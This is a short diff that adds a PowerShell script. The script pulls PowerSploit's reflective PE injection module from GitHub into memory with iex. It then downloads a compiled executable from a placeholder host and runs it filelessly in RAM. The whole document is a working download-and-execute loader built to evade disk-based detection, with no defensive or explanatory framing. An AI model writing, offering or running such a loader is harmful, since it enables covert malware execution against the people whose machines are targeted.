@@ -1,0 +1,9 @@
+# 1. Pull down the injection engine into memory
+$FrameworkUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
+iex (Invoke-RestMethod -Uri $FrameworkUrl)
+
+# 2. Download your compiled C++ EXE into RAM as a byte array
+$EXEBytes = (New-Object System.Net.WebClient).DownloadData("your-hosting-site.com")
+
+# 3. Execute the EXE filelessly, passing arguments directly into memory
+Invoke-ReflectivePEInjection -PEBytes $EXEBytes -ExeArgs "-yourflag -debug" -ForceASLR
